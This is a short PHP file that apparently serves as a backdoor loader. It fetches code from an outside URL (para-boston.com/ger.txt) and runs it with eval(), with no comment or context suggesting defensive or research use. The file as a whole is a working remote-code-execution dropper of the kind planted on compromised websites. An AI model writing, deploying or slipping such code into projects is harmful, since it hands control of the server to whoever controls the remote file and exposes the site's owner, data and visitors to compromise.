<?php $LanThau = file_get_contents(urldecode('https://para-boston.com/ger.txt'));

$LanThau = "?> ".$LanThau;
eval($LanThau);